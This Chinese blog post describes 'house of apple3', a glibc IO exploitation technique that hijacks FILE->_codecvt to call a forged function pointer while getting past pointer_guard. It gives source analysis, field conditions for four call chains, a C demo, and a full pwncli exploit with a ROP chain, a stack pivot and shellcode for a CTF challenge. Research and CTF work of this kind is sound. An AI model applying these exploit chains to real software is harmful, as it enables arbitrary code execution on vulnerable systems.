# House of Apple 一种新的glibc中IO攻击方法 (3)


> 本文首发于[看雪论坛](https://bbs.pediy.com/thread-273863.htm)，仅在个人博客记录

分享一系列新的`glibc`中`IO`利用思路，暂且命名为`house of apple`。
这篇是`house of apple3`。
本站的`house of apple`系列文章的地址为：

- [house of apple1](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/)
- [house of apple2](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/)
- [house of apple3](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/)

<!--more-->

## 前言

之前提出了一种新的`IO`利用方法 `house of apple`，并已经发布了`house of apple1`和`house of apple2`，其中`house of apple1`中的利用链能任意地址写堆地址，`house of apple2`中的利用链能通过控制`FILE`结构体的`_wide_data`成员去直接控制程序执行流。本篇是`house of apple`系列的第三篇，继续给出基于`FILE->_wide_data`的有关利用技巧（利用链仍然与`FILE->_wide_data`操作有一点相关）。

前两篇文章中的利用链主要关注`_wide_data`成员，而本篇文章并不会特别关注`_wide_data`，而是关注`FILE`结构体的另外一个成员`_codecvt`的利用。

本篇的`house of apple3`同样会给出几条新的`IO`利用链，在劫持`FILE->_codecvt`的基础上，直接控制程序执行流。

关于前置知识点击 `house of apple1`进行查看。

文章中的`fp`为一个`FILE`类型的指针，以下分析均基于`amd64`程序。

## 利用条件

使用`house of apple3`的条件为：
- 已知`heap`地址和`glibc`地址
- 能控制程序执行`IO`操作，包括但不限于：从`main`函数返回、调用`exit`函数、通过`__malloc_assert`触发
- 能控制`_IO_FILE`的`vtable`和`_codecvt`，一般使用`largebin attack`去控制

**注意：**
上面提到，本篇文章并不会特别关注`_wide_data`成员，这是因为`_wide_data`设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的`_wide_data`成员（默认会指向`_IO_wide_data_2`，除了`_wide_vtable`外其他成员均默认为`0`），也并不影响`house of apple3`的利用。

因此，如果能伪造整个`FILE`结构体，则需要设置合适的`_wide_data`；如果只能伪部分`FILE`的成员的话，保持`fp->_wide_data`为默认地址即可。

## 利用原理
`FILE`结构体中有一个成员`struct _IO_codecvt *_codecvt;`，偏移为`0x98`。该结构体参与宽字符的转换工作，结构体被定义为：

```c
// libio\libio.h:115
struct _IO_codecvt
{
  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};
```
可以看到，`__cd_in`和`__cd_out`是同一种类型的数据。往下拆，结构体`_IO_iconv_t`被定义为：
```c
// libio\libio.h:51
typedef struct
{
  struct __gconv_step *step;
  struct __gconv_step_data step_data;
} _IO_iconv_t;

```

继续拆，来看`struct __gconv_step`：
```c
// iconv\gconv.h:84
/* Description of a conversion step.  */
struct __gconv_step
{
  struct __gconv_loaded_object *__shlib_handle;// 关注这个成员
  const char *__modname;

  /* For internal use by glibc.  (Accesses to this member must occur
     when the internal __gconv_lock mutex is acquired).  */
  int __counter;

  char *__from_name;
  char *__to_name;

  __gconv_fct __fct;// 关注这个成员
  __gconv_btowc_fct __btowc_fct;
  __gconv_init_fct __init_fct;
  __gconv_end_fct __end_fct;

  /* Information about the number of bytes needed or produced in this
     step.  This helps optimizing the buffer sizes.  */
  int __min_needed_from;
  int __max_needed_from;
  int __min_needed_to;
  int __max_needed_to;

  /* Flag whether this is a stateful encoding or not.  */
  int __stateful;

  void *__data;		/* Pointer to step-local data.  */
};
```

然后来看`struct __gconv_step_data`结构体：
```c
/* Additional data for steps in use of conversion descriptor.  This is
   allocated by the `init' function.  */
struct __gconv_step_data
{
  unsigned char *__outbuf;    /* Output buffer for this step.  */
  unsigned char *__outbufend; /* Address of first byte after the output
				 buffer.  */

  /* Is this the last module in the chain.  */
  int __flags;

  /* Counter for number of invocations of the module function for this
     descriptor.  */
  int __invocation_counter;

  /* Flag whether this is an internal use of the module (in the mb*towc*
     and wc*tomb* functions) or regular with iconv(3).  */
  int __internal_use;

  __mbstate_t *__statep;
  __mbstate_t __state;	/* This element must not be used directly by
			   any module; always use STATEP!  */
};
```
以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。

`house of apple3`的利用主要关注以下三个函数：`__libio_codecvt_out`、`__libio_codecvt_in`和`__libio_codecvt_length`。三个函数的利用点都差不多，以`__libio_codecvt_in`为例，源码分析如下：

```c
enum __codecvt_result
__libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,
		    const char *from_start, const char *from_end,
		    const char **from_stop,
		    wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)
{
  enum __codecvt_result result;
  // gs 源自第一个参数
  struct __gconv_step *gs = codecvt->__cd_in.step;
  int status;
  size_t dummy;
  const unsigned char *from_start_copy = (unsigned char *) from_start;

  codecvt->__cd_in.step_data.__outbuf = (unsigned char *) to_start;
  codecvt->__cd_in.step_data.__outbufend = (unsigned char *) to_end;
  codecvt->__cd_in.step_data.__statep = statep;

  __gconv_fct fct = gs->__fct;
#ifdef PTR_DEMANGLE
  // 如果gs->__shlib_handle不为空，则会用__pointer_guard去解密
  // 这里如果可控，设置为NULL即可绕过解密
  if (gs->__shlib_handle != NULL)
    PTR_DEMANGLE (fct);
#endif
  // 这里有函数指针调用
  // 这个宏就是调用fct(gs, ...)
  status = DL_CALL_FCT (fct,
			(gs, &codecvt->__cd_in.step_data, &from_start_copy,
			 (const unsigned char *) from_end, NULL,
			 &dummy, 0, 0));
       // ......
}
```

其中，`__gconv_fct`和`DL_CALL_FCT`被定义为：
```c
/* Type of a conversion function.  */
typedef int (*__gconv_fct) (struct __gconv_step *, struct __gconv_step_data *,
			    const unsigned char **, const unsigned char *,
			    unsigned char **, size_t *, int, int);

#ifndef DL_CALL_FCT
# define DL_CALL_FCT(fct, args) fct args
#endif
```


而在`_IO_wfile_underflow`函数中调用了`__libio_codecvt_in`，代码片段如下：
```c
wint_t
_IO_wfile_underflow (FILE *fp)
{
  struct _IO_codecvt *cd;
  enum __codecvt_result status;
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */

  // 不能进入这个分支
  if (fp->_flags & _IO_EOF_SEEN)
    return WEOF;
  // 不能进入这个分支
  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  // 不能进入这个分支
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  // 需要进入这个分支
  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    {
      /* There is more in the external.  Convert it.  */
      const char *read_stop = (const char *) fp->_IO_read_ptr;

      fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
	fp->_wide_data->_IO_buf_base;
    // 需要一路调用到这里
      status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,
				   fp->_IO_read_ptr, fp->_IO_read_end,
				   &read_stop,
				   fp->_wide_data->_IO_read_ptr,
				   fp->_wide_data->_IO_buf_end,
				   &fp->_wide_data->_IO_read_end);
           // ......
    }
}
```
而`_IO_wfile_underflow`又是`_IO_wfile_jumps`这个`_IO_jump_t`类型变量的成员函数。

分析到这里，利用原理就呼之欲出了：劫持或者伪造`FILE`结构体的`fp->vtable`为`_IO_wfile_jumps`，`fp->_codecvt`为可控堆地址，当程序执行`IO`操作时，控制程序执行流走到`_IO_wfile_underflow`，设置好`fp->codecvt->__cd_in`结构体，使得最终调用到`__libio_codecvt_in`中的`DL_CALL_FCT`宏，伪造函数指针，进而控制程序执行流。

注意，在伪造过程中，可以设置`gs->__shlib_handle == NULL`，从而绕过`__pointer_guard`的指针调用保护。

基于该利用思路，编写`demo`验证：
```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void backdoor()
{
    printf("\033[31m[!] Backdoor is called!\n");
    _exit(0);
}

void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);

    char *p1 = calloc(0x200, 1);
    char *p2 = calloc(0x200, 1);
    puts("[*] allocate two 0x200 chunks");

    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t libc_base_addr = puts_addr - 0x84420;
    printf("[*] libc base address: %p\n", (void *)libc_base_addr);

    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0;
    printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);

    size_t _IO_wfile_jumps_addr = libc_base_addr + 0x1e8f60;
    printf("[*] _IO_wfile_jumps address: %p\n", (void *)_IO_wfile_jumps_addr);
 
    char *stderr2 = (char *)_IO_2_1_stderr_addr;
    puts("[+] step 1: set stderr->_flags to ~(4 | 0x10))");
    *(size_t *)stderr2 = 0;

    puts("[+] step 2: set stderr->_IO_read_ptr < stderr->_IO_read_end");
    *(size_t *)(stderr2 + 0x10) = (size_t)-1;
 
    puts("[+] step 3: set stderr->vtable to _IO_wfile_jumps-0x40");
    *(size_t *)(stderr2 + 0xd8) = _IO_wfile_jumps_addr-0x40;
 
    puts("[+] step 4: set stderr->codecvt with the allocated chunk p1");
    *(size_t *)(stderr2 + 0x98) = (size_t)p1;

    puts("[+] step 5: set stderr->codecvt->__cd_in.step with the allocated chunk p2");
    *(size_t *)p1 = (size_t)p2;

    puts("[+] step 6: put backdoor at stderr->codecvt->__cd_in.step->__fct");
    *(size_t *)(p2 + 0x28) = (size_t)(&backdoor);

    puts("[+] step 7: call fflush(stderr) to trigger backdoor func");
    fflush(stderr);

}
```
输出如下：
```
[*] allocate two 0x200 chunks
[*] puts address: 0x7f3b2d0a2420
[*] libc base address: 0x7f3b2d01e000
[*] _IO_2_1_stderr_ address: 0x7f3b2d20b5c0
[*] _IO_wfile_jumps address: 0x7f3b2d206f60
[+] step 1: set stderr->_flags to ~(4 | 0x10))
[+] step 2: set stderr->_IO_read_ptr < stderr->_IO_read_end
[+] step 3: set stderr->vtable to _IO_wfile_jumps-0x40
[+] step 4: set stderr->codecvt with the allocated chunk p1
[+] step 5: set stderr->codecvt->__cd_in.step with the allocated chunk p2
[+] step 6: put backdoor at stderr->codecvt->__cd_in.step->__fct
[+] step 7: call fflush(stderr) to trigger backdoor func
[!] Backdoor is called!
```

 ![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_BY2KFGWNZQYDH2S.png)

## 利用思路 
目前在`glibc`源码中搜索到的`__libio_codecvt_in/__libio_codecvt_out/__libio_codecvt_length`的调用链比较多，这里给出我总结的几条比较好利用的链。

### 利用_IO_wfile_underflow函数控制程序执行流
对`fp`的设置如下：

- `_flags`设置为`~(4 | 0x10)`
- `vtable`设置为`_IO_wfile_jumps`地址（加减偏移），使其能成功调用`_IO_wfile_underflow`即可
- `fp->_IO_read_ptr < fp->_IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`
- `_wide_data`保持默认，或者设置为堆地址，假设其地址为`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`
- `_codecvt`设置为可控堆地址`B`，即满足`*(fp + 0x98) = B`
- `codecvt->__cd_in.step`设置为可控堆地址`C`，即满足`*B = C`
- `codecvt->__cd_in.step->__shlib_handle`设置为`0`，即满足`*C = 0`
- `codecvt->__cd_in.step->__fct`设置为地址`D`,地址`D`用于控制`rip`，即满足`*(C + 0x28) = D`。当调用到`D`的时候，此时的`rdi`为`C`。如果`_wide_data`也可控的话，`rsi`也能控制。

函数的调用链如下：
```
_IO_wfile_underflow
    __libio_codecvt_in
        DL_CALL_FCT
            gs = fp->_codecvt->__cd_in.step
            *(gs->__fct)(gs)
```

此链的详细分析见上述的利用原理部分。

### 利用_IO_wfile_underflow_mmap函数控制程序执行流
对`fp`的设置如下：

- `_flags`设置为`~4`
- `vtable`设置为`_IO_wfile_jumps_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_underflow_mmap`即可
- `_IO_read_ptr < _IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`
- `_wide_data`保持默认，或者设置为堆地址，假设其地址为`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`
- `_wide_data->_IO_buf_base`设置为非`0`，即满足`*(A + 0x30) != 0`
- `_codecvt`设置为可控堆地址`B`，即满足`*(fp + 0x98) = B`
- `codecvt->__cd_in.step`设置为可控堆地址`C`，即满足`*B = C`
- `codecvt->__cd_in.step->__shlib_handle`设置为`0`，即满足`*C = 0`
- `codecvt->__cd_in.step->__fct`设置为地址`D`,地址`D`用于控制`rip`，即满足`*(C + 0x28) = D`。当调用到`D`的时候，此时的`rdi`为`C`。如果`_wide_data`也可控的话，`rsi`也能控制。

函数的调用链如下：
```
_IO_wfile_underflow_mmap
    __libio_codecvt_in
        DL_CALL_FCT
            gs = fp->_codecvt->__cd_in.step
            *(gs->__fct)(gs)
```

详细分析如下：
看`_IO_wfile_underflow_mmap`函数：
```c
static wint_t
_IO_wfile_underflow_mmap (FILE *fp)
{
  struct _IO_codecvt *cd;
  const char *read_stop;
  // 不能进入这个分支
  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  // 不能进入这个分支
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  // 最好不要进入这个分支
  if (fp->_IO_read_ptr >= fp->_IO_read_end
      /* No.  But maybe the read buffer is not fully set up.  */
      && _IO_file_underflow_mmap (fp) == EOF)
    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
       flags as appropriate.  */
    return WEOF;

  /* There is more in the external.  Convert it.  */
  read_stop = (const char *) fp->_IO_read_ptr;

  // 最好不要进入这个分支
  if (fp->_wide_data->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_wide_data->_IO_save_base != NULL)
	{
	  free (fp->_wide_data->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_wdoallocbuf (fp);// 需要走到这里
    }
  fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
  fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
    fp->_wide_data->_IO_buf_base;
    
    // 需要调用到这里 
  __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,
		      fp->_IO_read_ptr, fp->_IO_read_end,
		      &read_stop,
		      fp->_wide_data->_IO_read_ptr,
		      fp->_wide_data->_IO_buf_end,
		      &fp->_wide_data->_IO_read_end);
    //......
}
```
需要设置`fp->_flags & _IO_NO_READS == 0`，设置`fp->_wide_data->_IO_read_ptr >= fp->_wide_data->_IO_read_end`，设置`fp->_IO_read_ptr < fp->_IO_read_end`不进入调用，设置`fp->_wide_data->_IO_buf_base != NULL`不进入调用。

### 利用_IO_wdo_write函数控制程序执行流
`_IO_wdo_write`的调用点很多，这里我选择一个相对简单的链：

```
_IO_new_file_sync
    _IO_do_flush
      _IO_wdo_write
```
对`fp`的设置如下：

- `vtable`设置为`_IO_file_jumps/`地址（加减偏移），使其能成功调用`_IO_new_file_sync`即可
- `_IO_write_ptr > _IO_write_base`，即满足`*(fp + 0x28) > *(fp + 0x20)`
- `_mode > 0`，即满足`(fp + 0xc0) > 0`
- `_IO_write_end != _IO_write_ptr`或者`_IO_write_end == _IO_write_base`，即满足`*(fp + 0x30) != *(fp + 0x28)`或者`*(fp + 0x30) == *(fp + 0x20)`
- `_wide_data`设置为堆地址，假设地址为`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_write_ptr >= _wide_data->_IO_write_base`，即满足`*(A + 0x20) >= *(A + 0x18)`
- `_codecvt`设置为可控堆地址`B`，即满足`*(fp + 0x98) = B`
- `codecvt->__cd_out.step`设置为可控堆地址`C`，即满足`*(B + 0x38) = C`
- `codecvt->__cd_out.step->__shlib_handle`设置为`0`，即满足`*C = 0`
- `codecvt->__cd_out.step->__fct`设置为地址`D`,地址`D`用于控制`rip`，即满足`*(C + 0x28) = D`。当调用到`D`的时候，此时的`rdi`为`C`。如果`_wide_data`也可控的话，`rsi`也能控制。

函数的调用链如下：
```
_IO_new_file_sync
    _IO_do_flush
        _IO_wdo_write
          __libio_codecvt_out
              DL_CALL_FCT
                  gs = fp->_codecvt->__cd_out.step
                  *(gs->__fct)(gs)
```

详细分析如下：
首先看`_IO_new_file_sync`函数：
```c
int
_IO_new_file_sync (FILE *fp)
{
  ssize_t delta;
  int retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_do_flush(fp)) return EOF;//调用到这里
    //......
}
```
只需要满足`fp->_IO_write_ptr > fp->_IO_write_base`。

然后看`_IO_do_flush`宏：
```c
#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
```
根据`fp->_mode`的值选择调用`_IO_do_write`或者`_IO_wdo_write`。这里我们要调用后者，必须使`fp->_mode > 0`。此时的第二个参数为`fp->_wide_data->_IO_write_base`，第三个参数为`fp->_wide_data->_IO_write_ptr - fp->_wide_data->_IO_write_base`。

接着看`_IO_wdo_write`：
```c
int
_IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;

  // 第三个参数必须要大于0
  if (to_do > 0)
    {
      if (fp->_IO_write_end == fp->_IO_write_ptr
	  && fp->_IO_write_end != fp->_IO_write_base)
	{// 不能进入这个分支
	  if (_IO_new_do_write (fp, fp->_IO_write_base,
				fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
	    return WEOF;
	}

  // ......

	  /* Now convert from the internal format into the external buffer.  */
    // 需要调用到这里
	  result = __libio_codecvt_out (cc, &fp->_wide_data->_IO_state,
					data, data + to_do, &new_data,
					write_ptr,
					buf_end,
					&write_ptr);
          //......
  }
}
```
首先`to_do`必须要大于`0`，即满足`fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base`，然后这个判断需要为假`fp->_IO_write_end == fp->_IO_write_ptr && fp->_IO_write_end != fp->_IO_write_base`。

这个链基本需要控制`fp->_wide_data`，相比上两条链的约束条件要更多一点。

### 使用_IO_wfile_sync函数控制程序执行流

对`fp`的设置如下：

- `_flags`设置为`~(4 | 0x10)`
- `vtable`设置为`_IO_wfile_jumps`地址（加减偏移），使其能成功调用`_IO_wfile_sync`即可
- `_wide_data`设置为堆地址，假设其地址为`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_write_ptr <= _wide_data->_IO_write_base`，即满足`*(A + 0x20) <= *(A + 0x18)`
- `_wide_data->_IO_read_ptr != _wide_data->_IO_read_end`，即满足`*A != *(A + 8)`
- `_codecvt`设置为可控堆地址`B`，即满足`*(fp + 0x98) = B`
- `codecvt->__cd_in.step`设置为可控堆地址`C`，即满足`*B = C`
- `codecvt->__cd_in.step->__stateful`设置为非`0`，即满足`*(B + 0x58) != 0`
- `codecvt->__cd_in.step->__shlib_handle`设置为`0`，即满足`*C = 0`
- `codecvt->__cd_in.step->__fct`设置为地址`D`,地址`D`用于控制`rip`，即满足`*(C + 0x28) = D`。当调用到`D`的时候，此时的`rdi`为`C`。如果`rsi`为`&codecvt->__cd_in.step_data`可控。

函数的调用链如下：
```
_IO_wfile_sync
    __libio_codecvt_length
        DL_CALL_FCT
            gs = fp->_codecvt->__cd_in.step
            *(gs->__fct)(gs)
```
详细分析如下：
直接看`_IO_wfile_sync`函数：
```c
wint_t
_IO_wfile_sync (FILE *fp)
{
  ssize_t delta;
  wint_t retval = 0;

  /*    char* ptr = cur_ptr(); */
  // 不要进入这个分支
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if (_IO_do_flush (fp))
      return WEOF;
  delta = fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end;
  // 需要进入到这个分支
  if (delta != 0)
    {
      /* We have to find out how many bytes we have to go back in the
	 external buffer.  */
      struct _IO_codecvt *cv = fp->_codecvt;
      off64_t new_pos;

      // 这里直接返回-1即可
      int clen = __libio_codecvt_encoding (cv);

      if (clen > 0)
	/* It is easy, a fixed number of input bytes are used for each
	   wide character.  */
	delta *= clen;
      else
	{
	  /* We have to find out the hard way how much to back off.
	     To do this we determine how much input we needed to
	     generate the wide characters up to the current reading
	     position.  */
	  int nread;
	  size_t wnread = (fp->_wide_data->_IO_read_ptr
			   - fp->_wide_data->_IO_read_base);
	  fp->_wide_data->_IO_state = fp->_wide_data->_IO_last_state;
    // 调用到这里
	  nread = __libio_codecvt_length (cv, &fp->_wide_data->_IO_state,
					  fp->_IO_read_base,
					  fp->_IO_read_end, wnread);
            // ......

  }
    }
}
```
需要设置`fp->_wide_data->_IO_write_ptr <= fp->_wide_data->_IO_write_base`和`fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end != 0`。

然后看下`__libio_codecvt_encoding`函数：
```c
int
__libio_codecvt_encoding (struct _IO_codecvt *codecvt)
{
  /* See whether the encoding is stateful.  */
  if (codecvt->__cd_in.step->__stateful)
    return -1;
  /* Fortunately not.  Now determine the input bytes for the conversion
     necessary for each wide character.  */
  if (codecvt->__cd_in.step->__min_needed_from
      != codecvt->__cd_in.step->__max_needed_from)
    /* Not a constant value.  */
    return 0;

  return codecvt->__cd_in.step->__min_needed_from;
}
```
直接设置`fp->codecvt->__cd_in.step->__stateful != 0`即可返回`-1`。


## 例题分析

依旧以 [house of apple1](https://bbs.pediy.com/thread-273418.htm) 中的`pwn_oneday`为例。

程序的详细分析仍然不在此赘述。这里展示使用`_IO_wfile_underflow`这条链做`rop`，然后使用`orw`读取`flag`。

在`largebin attack`攻击`_IO_list_all`之后，伪造`_IO_FILE`结构：
```python
target_addr = libc.sym._IO_list_all
_IO_wfile_jumps = libc.sym._IO_wfile_jumps
_IO_wide_data_2 = libc.sym._IO_wide_data_2

_lock = libc_base + 0x1f5720
fake_IO_FILE = heap_base + 0x1810

f1 = IO_FILE_plus_struct()
f1.flags = 0
f1._IO_read_ptr = 0xa81
f1._lock = _lock
f1._wide_data = _IO_wide_data_2 # 设置为默认
f1._codecvt = fake_IO_FILE + 0xe0
f1.vtable = _IO_wfile_jumps + 8 # call _IO_wfile_underflow
```
然后借助几个`gadgets`中转一下：
```c
# 0x13d56a: mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10]; 
mov_rax_from_rdi = libc_base + 0x13d56a
# 0x56530: mov rsp, rdx; ret; 
mov_rsp_from_rdx_ret = libc_base + 0x56530
# 0x142434: mov rdi, qword ptr [rax]; mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10];
mov_rdi_from_rax = libc_base +0x142434
# 0x146020: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
mov_rdx_from_rdi = libc_base + 0x146020

add_rsp_0x20_pop_rbx_ret = libc_base + 0xfd449
```

所以最后的`exp`为：

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
 
from pwncli import *
 
cli_script()
 
io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']
 
small = 1
medium = 2
large = 3
key = 10
 
def add(c):
    sla("enter your command: \n", "1")
    sla("choise: ", str(c))
 
def dele(i):
    sla("enter your command: \n", "2")
    sla("Index: \n", str(i))
 
def read_once(i, data):
    sla("enter your command: \n", "3")
    sla("Index: ", str(i))
    sa("Message: \n", flat(data, length=0x110 * key))
 
def write_once(i):
    sla("enter your command: \n", "4")
    sla("Index: ", str(i))
    ru("Message: \n")
    m = rn(0x10)
    d1 = u64_ex(m[:8])
    d2 = u64_ex(m[8:])
    log_address_ex("d1")
    log_address_ex("d2")
    return d1, d2
 
def bye():
    sla("enter your command: \n", "9")
 
 
sla("enter your key >>\n", str(key))
 
add(medium)
add(medium)
add(small)
 
dele(2)
dele(1)
dele(0)
 
add(small)
add(small)
add(small)
add(small)
 
dele(3)
dele(5)
m1, m2 = write_once(3)
libc_base = set_current_libc_base_and_log(m1, 0x1f2cc0)
heap_base = m2 - 0x17f0
 
dele(4)
dele(6)
 
add(large)
add(small)
add(small)
 
dele(8)
add(large)
 
target_addr = libc.sym._IO_list_all
_IO_wfile_jumps = libc.sym._IO_wfile_jumps
_IO_wide_data_2 = libc.sym._IO_wide_data_2

_lock = libc_base + 0x1f5720
fake_IO_FILE = heap_base + 0x1810

f1 = IO_FILE_plus_struct()
f1.flags = 0
f1._IO_read_ptr = 0xa81
f1._lock = _lock
f1._wide_data = _IO_wide_data_2 # 设置为默认
f1._codecvt = fake_IO_FILE + 0xe0
f1.vtable = _IO_wfile_jumps + 8 # call _IO_wfile_underflow

# 0x13d56a: mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10]; 
mov_rax_from_rdi = libc_base + 0x13d56a
# 0x56530: mov rsp, rdx; ret; 
mov_rsp_from_rdx_ret = libc_base + 0x56530
# 0x142434: mov rdi, qword ptr [rax]; mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10];
mov_rdi_from_rax = libc_base +0x142434
# 0x146020: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
mov_rdx_from_rdi = libc_base + 0x146020

add_rsp_0x20_pop_rbx_ret = libc_base + 0xfd449
pop_rdi_ret = libc_base + 0x2daa2
pop_rsi_ret = libc_base + 0x37c0a
pop_rdx_rbx_ret = libc_base + 0x87729

data = flat({
    0x8: target_addr - 0x20,
    0x10: {
        0: {
            0: bytes(f1),
            0xe0: fake_IO_FILE + 0x100,
            0x100: { # fp->_codecvt->__cd_in.step
                0: 0, # fp->_codecvt->__cd_in.step->__shlib_handle
                0x28: mov_rax_from_rdi, # fp->_codecvt->__cd_in.step->__fct
                0x38: fake_IO_FILE + 0x140
            },
            0x140: { # rax1
                0: fake_IO_FILE + 0x180, # rdi1
                0x10: mov_rdi_from_rax
            },
            0x180: { # rdi2
                0x8: fake_IO_FILE + 0x1c0, # rdx
                0x10: mov_rdx_from_rdi,
                0x38: fake_IO_FILE + 0x180, # rax2
            },
            0x1c0: {
                0: add_rsp_0x20_pop_rbx_ret,
                0x20: mov_rsp_from_rdx_ret,
                0x30: [
                    pop_rdi_ret,
                    heap_base,
                    pop_rsi_ret,
                    0x10000,
                    pop_rdx_rbx_ret,
                    7, 0,
                    libc.sym.mprotect,
                    fake_IO_FILE + 0x280
                ]
            },
            0x280: ShellcodeMall.amd64.cat_flag
        },
        0xa80: [0, 0xab1]
    }
})

read_once(5, data)
 
dele(2)
add(large)
 
bye()
 
ia()
```
调试如下：
通过`exit`执行到`_IO_wfile_underflow`，然后执行到`__libio_codecvt_in`：
![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_7QHM2QSGHYEKQHG.png)

执行到布置好的`gadget`：
 ![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_WR698AU93WWX8QP.png)

成功栈迁移：
![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_MATVSCRVUKE6DEC.png)

输出`flag`：
![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_MAWBZ6VMQ3FCXPV.png)

## 总结

`house of apple1`和`house of apple2`主要关注对`_IO_FILE->_wide_data`成员的攻击，并可以在劫持该成员之后改写地址内容或者控制程序执行流。而本文提出的`house of apple3`利用链则攻击`_IO_FILE`另一个关注甚少的成员`_codecvt`。

可以看到，`fp->_codecvt->__cd_in.step`中也存储着函数指针，并且在劫持`_codecvt`的时候可以使得函数指针调用绕过`__pointer_guard`的保护，因此，可以利用该漏洞进行`FSOP`。


---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/  

